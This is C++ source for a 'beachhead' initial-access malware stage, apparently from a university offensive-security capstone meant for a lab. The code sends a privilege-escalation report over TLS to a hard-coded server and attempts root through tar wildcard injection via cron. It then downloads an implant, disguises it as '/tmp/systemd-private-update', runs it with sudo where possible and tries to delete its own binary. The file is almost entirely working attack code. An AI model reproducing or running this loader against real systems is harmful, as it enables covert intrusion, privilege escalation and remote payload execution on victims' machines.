/*
 * COMPSCI564 - Cyber Effects Capstone Project
 * Beachhead - Initial Access Stage (Stealth-Enhanced)
 *
 * This version:
 *  - Checks privesc viability (stealth)
 *  - Exfiltrates the privesc check directly to the exfil server via TLS
 *  - Downloads the TLS certificate for both its own use and the implant
 *  - Attempts privilege escalation via tar wildcard injection
 *  - Downloads and launches the implant
 *
 * For educational use in controlled lab environment only.
 */

#include <cstdlib>
#include <string>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <cstring>
#include <fstream>
#include <sstream>

// OpenSSL
#include <openssl/ssl.h>
#include <openssl/err.h>

// Networking (needed for TLS exfiltration)
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Modules
#include "privesc_check.h"
#include "privesc.h"

// Configuration (set via Makefile)
#ifndef URL
#define URL "http://10.37.1.249/implant"
#endif
#ifndef CERT_URL
#define CERT_URL "http://10.37.1.249/cert.pem"
#endif
#ifndef EXFIL_IP
#define EXFIL_IP "10.37.1.249"
#endif
#ifndef EXFIL_PORT
#define EXFIL_PORT 8889
#endif

// ----------------------------------------------------------------------
// Minimal logging (only when DEBUG is defined)
// ----------------------------------------------------------------------
static void log_status(const char* msg) {
#ifdef DEBUG
    size_t len = 0;
    while (msg[len]) len++;
    syscall(SYS_write, 2, msg, len);  // stderr
    syscall(SYS_write, 2, "\n", 1);
#else
    (void)msg;
#endif
}

// ----------------------------------------------------------------------
// Download a file using wget (quiet, no output) – system() for PATH lookup
// ----------------------------------------------------------------------
static bool download_file(const char* url, const char* dest) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "wget -q '%s' -O '%s' >/dev/null 2>&1", url, dest);
    int ret = system(cmd);
    return (ret == 0);
}

// ----------------------------------------------------------------------
// Check if current user can run sudo without a password
// ----------------------------------------------------------------------
static bool can_sudo_nopasswd() {
    int ret = system("sudo -n true >/dev/null 2>&1");
    return (ret == 0);
}

// ----------------------------------------------------------------------
// Minimal TLS + exfiltration of the privesc check result
// Returns true on success, false on any failure (connection, handshake, etc.)
// ----------------------------------------------------------------------
static bool exfiltrate_privesc_check(const PrivEscConditions& cond,
                                     const char* cert_path) {
    // Initialise OpenSSL
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return false;

    if (SSL_CTX_load_verify_locations(ctx, cert_path, nullptr) != 1) {
        SSL_CTX_free(ctx);
        return false;
    }
    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, nullptr);

    // Create socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        SSL_CTX_free(ctx);
        return false;
    }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(EXFIL_PORT);
    if (inet_pton(AF_INET, EXFIL_IP, &addr.sin_addr) != 1) {
        close(sock);
        SSL_CTX_free(ctx);
        return false;
    }

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        SSL_CTX_free(ctx);
        return false;
    }

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    SSL_set_tlsext_host_name(ssl, EXFIL_IP);

    if (SSL_connect(ssl) != 1) {
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        close(sock);
        SSL_CTX_free(ctx);
        return false;
    }

    // Format the privesc viability report
    std::ostringstream msg;
    msg << "[PRIVESC CHECK]\n";
    msg << "backups_dir_exists: " << (cond.backups_dir_exists ? "yes" : "no") << "\n";
    msg << "backups_dir_writable: " << (cond.backups_dir_writable ? "yes" : "no") << "\n";
    msg << "tar_available: " << (cond.tar_available ? "yes" : "no") << "\n";
    msg << "cron_running: " << (cond.cron_running ? "yes" : "no") << "\n";
    msg << "current_uid: " << cond.current_uid << "\n";
    msg << "username: " << cond.username << "\n";
    std::string payload = msg.str();

    // Send it (best effort)
    SSL_write(ssl, payload.c_str(), payload.size());

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sock);
    SSL_CTX_free(ctx);
    return true;
}

// ----------------------------------------------------------------------
// Main entry point
// ----------------------------------------------------------------------
int main() {
    log_status("[*] Stage 1: Checking privilege escalation conditions...");

    PrivEscConditions cond = check_privesc_viability();

    // --- Exfiltrate the privesc check immediately via TLS ---
    // Download the certificate now (it will be reused by the implant)
    const char* cert_path = "/tmp/index.html";
    if (!download_file(CERT_URL, cert_path)) {
        log_status("[!] Failed to download certificate for exfil");
    } else {
        log_status("[*] Exfiltrating privesc check to exfil server...");
        bool sent = exfiltrate_privesc_check(cond, cert_path);
        log_status(sent ? "[+] Privesc check exfiltrated" : "[!] Privesc check exfiltration failed");
    }

#ifdef DEBUG
    char debug_msg[256] = "[*] UID: ";
    int pos = 9;
    unsigned int uid = cond.current_uid;
    char uid_str[16];
    int uid_len = 0;
    if (uid == 0) {
        uid_str[uid_len++] = '0';
    } else {
        char tmp[16];
        int tpos = 0;
        while (uid > 0) {
            tmp[tpos++] = '0' + (uid % 10);
            uid /= 10;
        }
        for (int i = tpos - 1; i >= 0; i--)
            uid_str[uid_len++] = tmp[i];
    }
    uid_str[uid_len] = '\0';
    for (int i = 0; i < uid_len; i++) debug_msg[pos++] = uid_str[i];
    const char* suffix = " | Backups writable: ";
    for (int i = 0; suffix[i]; i++) debug_msg[pos++] = suffix[i];
    const char* writable = cond.backups_dir_writable ? "YES" : "NO";
    for (int i = 0; writable[i]; i++) debug_msg[pos++] = writable[i];
    suffix = " | Tar: ";
    for (int i = 0; suffix[i]; i++) debug_msg[pos++] = suffix[i];
    const char* tar = cond.tar_available ? "YES" : "NO";
    for (int i = 0; tar[i]; i++) debug_msg[pos++] = tar[i];
    suffix = " | Cron: ";
    for (int i = 0; suffix[i]; i++) debug_msg[pos++] = suffix[i];
    const char* cron = cond.cron_running ? "YES" : "NO";
    for (int i = 0; cron[i]; i++) debug_msg[pos++] = cron[i];
    debug_msg[pos] = '\0';
    log_status(debug_msg);
#endif

    // ====================================================================
    // STAGE 2: Attempt privilege escalation (if conditions are met)
    // ====================================================================
    bool should_escalate = cond.backups_dir_writable &&
                           cond.tar_available &&
                           cond.cron_running &&
                           cond.current_uid != 0;

    if (should_escalate && !can_sudo_nopasswd()) {
        log_status("[*] Stage 2: Attempting privilege escalation...");
        if (execute_tar_privesc() == 0) {
            log_status("[+] Privilege escalation staged. Waiting for cron...");
            for (int i = 0; i < 15; i++) {
                struct timespec ts = {5, 0};
                syscall(SYS_nanosleep, &ts, nullptr);
                if (can_sudo_nopasswd()) {
                    log_status("[+] Successfully gained sudo privileges!");
                    break;
                }
            }
        } else {
            log_status("[!] Privilege escalation setup failed");
        }
    } else if (cond.current_uid == 0) {
        log_status("[+] Already running as root");
    } else if (can_sudo_nopasswd()) {
        log_status("[+] Already have sudo access");
    } else {
        log_status("[!] Privilege escalation conditions not met, proceeding anyway");
    }

    // ====================================================================
    // STAGE 3: Download the C++ implant
    // ====================================================================
    log_status("[*] Stage 3: Downloading implant...");

    const char* implant_path = "/tmp/systemd-private-update";

    // The certificate for the implant was already downloaded to /tmp/index.html
    if (!download_file(URL, implant_path)) {
        log_status("[!] Failed to download implant");
        return 1;
    }

    syscall(SYS_chmod, implant_path, 0755);
    log_status("[+] Implant downloaded");

    // ====================================================================
    // STAGE 4: Execute the implant with elevated privileges (if possible)
    // ====================================================================
    log_status("[*] Stage 4: Executing implant...");

    char run_cmd[512];
    if (can_sudo_nopasswd()) {
        snprintf(run_cmd, sizeof(run_cmd), "sudo -n '%s' >/dev/null 2>&1 &", implant_path);
    } else {
        snprintf(run_cmd, sizeof(run_cmd), "'%s' >/dev/null 2>&1 &", implant_path);
    }
    system(run_cmd);

    log_status("[+] Implant launched");

#ifndef DEBUG
    syscall(SYS_unlink, "/proc/self/exe");
#endif

    return 0;
}
